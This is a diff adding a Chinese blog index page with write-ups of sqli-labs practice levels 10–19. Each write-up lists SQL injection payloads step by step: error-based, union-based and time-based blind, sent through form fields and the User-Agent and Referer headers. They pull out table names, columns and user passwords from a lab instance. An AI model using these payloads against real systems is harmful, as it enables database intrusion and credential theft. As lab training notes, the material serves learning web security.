@@ -1,0 +1,163 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<meta property="og:title" content="懒大王的主场">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="懒大王的主场">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Sanyer">
+<meta name="twitter:card" content="summary"><title>懒大王的主场</title><link ref="canonical" href="http://example.com/page/2/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">懒大王的主场</div><div class="header-banner-info__subtitle">懒大王专场，舔羊勿进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-19/">SQLI-DUMB-SERIES-19</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>和上题区别不大，我们根据页面中给的提示，直接抓包在Referer添加’发现和上次报错一样一样的。好像这种都是这种形式。</p>
+<p>那我们就按照之前用的方式进行拼接</p>
+<p>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,database())) and’ 来用一波extractvalue，熟悉记忆一下。（我现在严重怀疑之前我那个可能是拼写错了🐶）</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0t168hg1fj30xw0fkad2.jpg" alt="img"></p>
+<p>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1))) and’</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0t1a6qc9oj30xv0hr77t.jpg" alt="img"></p>
+<p>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 2,1))) and’<br><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0t1orkx8aj30yj0i90wc.jpg" alt="img"></p>
+<p>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,(select password from users limit 0,1))) and’</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0t1rm3l4fj30wz0cj414.jpg" alt="img"></p>
+<p>好了查完了¯_(ツ)_&#x2F;¯</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-18/">SQLI-DUMB-SERIES-18</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>我们进行注入点的检测，再页面各位置都没反应。我们利用burp suit进行抓包。按照道理我们需要挨个试，但是根据页面的提示：you user agent is：</p>
+<p>所以我们尝试从User-Agent开始，输入’发现报错</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0sz4nn7adj30xi0ea776.jpg" alt="img"></p>
+<p>他的报错方式非常离谱，虽然这不影响我们对注入点的判断，但对于后续的操作有影响</p>
+<p>我们在后面添加%23</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0szaqbdo6j30xv0d7q60.jpg" alt="img"></p>
+<p>通过报错信息我们可以推断出这个完整的格式应该是(‘User-Agent’,’110.231.160.51’,’admin’)</p>
+<p>现在不知道他这到底是个什么样的东西，但很清楚单纯的注释掉后面是不可能的</p>
+<p>我们只能想个办法把他拼成和他差不多的样子</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’ and ‘</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0szfaytrpj30wv0cv40u.jpg" alt="img"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,database()),1) and ‘从现在开始，和常规注入的操作就一样了。查到了数据库名</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0szgsg8qzj30y30fmjun.jpg" alt="img"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x3e),1) and ‘</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0t0eky679j30wz0fqq6c.jpg" alt="img"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x3e),1) and ‘查出列名</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0t0giv8hoj30yk0cago7.jpg" alt="img"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,(select password from users where id&#x3D;’1’ limit 0,1),0x3e),1) and ‘查出表中密码</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0t0hwho2nj30y60hd77w.jpg" alt="img"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-17/">SQLI-DUMB-SERIES-17</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>z这一题相对来说比较新一些。</p>
+<p>这题模仿的是修改密码界面，首先我们依旧在username处进行测试。当单纯输入admin时，他直接显示“成功更新了你的密码”</p>
+<p>但发现无论后面如何输入，都显示的是BUG OFF YOU SILLY DUMB HACKER（据说是让我爬），那么肯定不能在这里了。</p>
+<p>我们尝试在在new password处进行测试，发现报错</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0ssodvw1xj31950ju77z.jpg" alt="img"></p>
+<p>虽然但是，我有点不能理解为什么报错出现在了admin（用户名）。没搞明白他到底是怎么传过去的。</p>
+<p>使用报错注入：</p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,database(),0x7e),1)%23–+&amp;submit&#x3D;Submit</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0stowvcybj30y20cajtp.jpg" alt="img"></p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where<br>table_schema&#x3D;database() limit 0,1 ),0x7e),1)%23–+&amp;submit&#x3D;Submit查表名</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0stsy5ed3j30v10e3mzc.jpg" alt="img"></p>
+<p>查出列名</p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where<br>table_name&#x3D;’users’ limit 0,1 ),0x7e),1)%23–+&amp;S&#x3D;Submit</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0suibwt11j30xb0fn0vy.jpg" alt="img"></p>
+<p><strong>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,(select password from (select id,username,password from users )as us limit 0,1 ),0x7e),1)%23–+&amp;S&#x3D;Submit</strong></p>
+<p>通过这个语句爆出表中的数据。由于原本的语句是更新，我们注入的是查找。</p>
+<p>因为不能在同一个sql语句中，先select同一个表的某些值，然后再update这个表。所以我们需要先把他做成一个临时表，然后从新做出来的表中去查询</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0suyeo82fj30xy0gbtc7.jpg" alt="img"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-16/">SQLI-DUMB-SERIES-16</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1</p>
+<p>通过’ 、”、’)、”）、‘））、“））的顺序进行探索。发现当输入为”)时十秒网页后返回</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and sleep(5)%23&amp;submit&#x3D;Submit</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0srv8mgrij30p10gfabl.jpg" alt="img"></p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( length(database())&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit数据库长度为8</p>
+<p>在每一次查找的时候，最好都先查找其长度或者总数量，为了避免繁琐，跑长度就不写了。</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr(database(),1,1)&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit依次改变截取的位长，在增加位长的同时把以跑出来的放在§前面。例子：uname&#x3D;admin&amp;passwd&#x3D;admin’and if(substr(database(),1,2)&#x3D;’s§a§’,sleep(5),1)%23&amp;submit&#x3D;Subit</p>
+<p>得出数据库名为security</p>
+<p>写个语句查出数据表的个数。</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr((select table_name from information_schema.tables where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit通过这个语句的变动，跑出所有表名</p>
+<p>我们发现，burp suite 的暴力破解表里面，只有小写字母和数字。所以我们应该添上大写的字母之后在进行爆破，或者直接用ascii码跑也行</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr((select username from users  limit 0,1),1,5)&#x3D;’Dumb§a§’,sleep(10),1)%23&amp;submit&#x3D;Submit</p>
+<p>跑出第一个用户名为Dumb</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr((select password from users where username&#x3D;’Dumb’  limit 0,1),1,4)&#x3D;’Dum§a§’,sleep(10),1)%23&amp;submit&#x3D;Submit</p>
+<p>跑出Dumb对应的密码为：Dumb</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-15/">SQLI-DUMB-SERIES-15</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>s</p>
+<p>输入各种东西，页面纹丝不动。（这个应该不科学）我们先进行抓包</p>
+<p>uname&#x3D;admin%22 and extractvalue(0x3e,concat(0x3e,(select password from users where id&#x3D;’2’),0x3c))  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<p>运气不错，直接搞出了闭合方式为’</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0sb8tybpyj30qz0gydh6.jpg" alt="img"></p>
+<p>我们将其发送到Intruder进行爆破</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin’and if( length(database())&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit首先我们跑出database的长度为8</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin’and if(substr(database(),1,1)&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Subit依次改变截取的位长，在增加位长的同时把以跑出来的放在§前面。例子：uname&#x3D;admin&amp;passwd&#x3D;admin’and if(substr(database(),1,2)&#x3D;’s§a§’,sleep(5),1)%23&amp;submit&#x3D;Subit</p>
+<p>得出数据库名为security</p>
+<p>写个语句查出数据表的个数。</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin’and if( substr((select table_name from information_schema.tables where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit通过这个语句的变动，跑出所有表名</p>
+<p>我们发现，burp suite 的暴力破解表里面，只有小写字母和数字。所以我们应该添上大写的字母之后在进行爆破，或者直接用ascii码跑也行</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin’and if( substr((select username from users  limit 0,1),1,5)&#x3D;’Dumb§a§’,sleep(10),1)%23&amp;submit&#x3D;Submit</p>
+<p>跑出第一个用户名为Dumb</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin’and if( substr((select password from users where username&#x3D;’Dumb’  limit 0,1),1,4)&#x3D;’Dum§a§’,sleep(10),1)%23&amp;submit&#x3D;Submit</p>
+<p>跑出Dumb对应的密码为：Dumb</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-14/">SQLI-DUMB-SERIES-14</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0safau5p4j311c085t9l.jpg" alt="img"></p>
+<p>不是同一个题目，但是同一个地点。今天表演一个admin加”</p>
+<p>很明显，，上面写的明明白白。看不懂翻之前的研究。就是简单的”闭合</p>
+<p>因为无回显，所以我们直接尝试报错注入。</p>
+<p>uname&#x3D;admin%22 and updatemxl(1,concat(0x3e,database(),1),1)  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit居然提示，updatexml功能不存在，好神奇欸</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0saqzpdaoj30pu0b0q4o.jpg" alt="img"></p>
+<p>我们只能使用拼写更加繁琐的extractvalue语法</p>
+<p>uname&#x3D;admin%22 and extractvalue(0x3e,concat(0x3e,database(),0x3c))  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit查出数据库名</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0sau1u664j30pw0c2abx.jpg" alt="img"></p>
+<p>uname&#x3D;admin%22 and extractvalue(0x3e,concat(0x3e,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 0,1),0x3c))  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit查出表名</p>
+<p>uname&#x3D;admin%22 and extractvalue(0x3e,concat(0x3e,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 1,1),0x3c))  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit查出users表的列名：id，username，password</p>
+<p>uname&#x3D;admin%22 and extractvalue(0x3e,concat(0x3e,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 1,1),0x3c))  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit查uses表中id为2的username为:Angelina</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0sb2ilmuej30qm0bnq4t.jpg" alt="img"></p>
+<p>uname&#x3D;admin%22 and extractvalue(0x3e,concat(0x3e,(select password from users where id&#x3D;’2’),0x3c))  %23&amp;passwd&#x3D;&amp;submit&#x3D;Submit查除id&#x3D;2的password为I-kill-you</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0sb3k1cpyj30np0bfmyn.jpg" alt="img"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-13/">SQLI-DUMB-SERIES-13</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0s9orhusej311b08r3zl.jpg" alt="img"></p>
+<p>从未见过这么清晰舒服的报错，不应该啊。刚刚前面的明明不是这样的啊。算了，不纠结了。反正都一样跑。</p>
+<p>继续抓包</p>
+<p>uname&#x3D;admin%27) and updatexml(1,concat(0x3e,database(),1),1)  %23  &amp;passwd&#x3D;&amp;submit&#x3D;Submit数据库名</p>
+<p>uname&#x3D;admin%27) and updatexml(1,concat(0x3e,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1),1),1)  %23  &amp;passwd&#x3D;&amp;submit&#x3D;Submit爆出users表名</p>
+<p>uname&#x3D;admin%27) and updatexml(1,concat(0x3e,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 0,1),1),1)  %23  &amp;passwd&#x3D;&amp;submit&#x3D;Submit得出user表中的列名</p>
+<p>uname&#x3D;admin%27) and updatexml(1,concat(0x3e,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 0,1),1),1)  %23  &amp;passwd&#x3D;&amp;submit&#x3D;Submit得出id为1的用户名</p>
+<p>uname&#x3D;admin%27) and updatexml(1,concat(0x3e,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 0,1),1),1)  %23  &amp;passwd&#x3D;&amp;submit&#x3D;Submit得出id为1的密码</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-12/">SQLI-DUMB-SERIES-12</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0s4rtg0yjj30yx0ayabp.jpg" alt="img"></p>
+<p>在做十三的时候，突然间username的报错又正常了。</p>
+<p>按照与上题相同的流程，得出这个的password也存在注入且闭合为“)，利用burp suite 进行抓包重发</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0s93xd4rxj30qe0e7tad.jpg" alt="img"></p>
+<p>依旧是两列，union select后无回显，看来得用报错注入</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and updatexml(0x3e,concat(1,(select database())),0x3e) %23&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and updatexml(0x3e,concat(1,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0x3e) %23&amp;submit&#x3D;Submit 依次查出表名</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and updatexml(0x3e,concat(1,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)),0x3e) %23&amp;submit&#x3D;Submit依次爆出列名</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and updatexml(0x3e,concat(1,(select username from users where id&#x3D;’1’ )),0x3e) %23&amp;submit&#x3D;Submitb爆出id为1的username</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and updatexml(0x3e,concat(1,(select password from users where username&#x3D;’Dumb’ )),0x3e) %23&amp;submit&#x3D;Submit查出Dumb对应的password</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-11/">SQLI-DUMB-SERIES-11</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>我们直接用admin、admin进行登录。</p>
+<p>发现，页面发生了变化但地址栏没用任何变动。我们尝试在password处输入a’发现报错</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0s2c4rbq6j30y609i0u3.jpg" alt="img"></p>
+<p>可以发现此处存在注入点且闭合为’</p>
+<p>我们进行抓包，把抓到的数据发送到Repeater</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0s3rncjdsj30pi0dp0up.jpg" alt="img"></p>
+<p>我们发现只有两行</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0s3wrb75wj30ut0ioadh.jpg" alt="img"></p>
+<p>好了，找到了两个回显位置，那么接下来就和正常的联合注入一样了</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;-admin’ union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23&amp;submit&#x3D;Submit</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0s3yssy0hj30tn0k6q6h.jpg" alt="img"></p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;-admin’ union select version(),group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ %23&amp;submit&#x3D;Submit</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0s4fpvthmj30sf0exmzg.jpg" alt="img"></p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;-admin’ union select version(),group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ %23&amp;submit&#x3D;Submit</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0s4jp5amxj30tl0gcgoc.jpg" alt="img"></p>
+<p>OK,拿捏了。这玩意比盲注舒服多了。盲注太折磨了。。。。。。。。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-10/">SQLI-DUMB-SERIES-10</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0rxgzr390j30ft060wep.jpg" alt="img"></p>
+<p>熟悉的操作熟悉的配方，当我们在1后面添加”时页面五秒后完成刷新，所以闭合为”</p>
+<p>?id&#x3D;1”and if(substr(database(),1,1)&#x3D;’s’,sleep(5),0)–+   查数据库名</p>
+<p>?id&#x3D;1” and if ((substr((select column_name from information_schema.columns where table_schema &#x3D;’security’ limit 3,1),1,1)&#x3D;’u’),sleep(5),0)–+查表名</p>
+<p>?id&#x3D;1” and if ((substr((select username from users limit 5,1),3,1)&#x3D;’D’),sleep(5),0)–+ 查数据</p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.png" alt="avatar"></div><p class="sidebar-ov-author__text">世间本浑浊，罪与爱同歌</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">35</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer 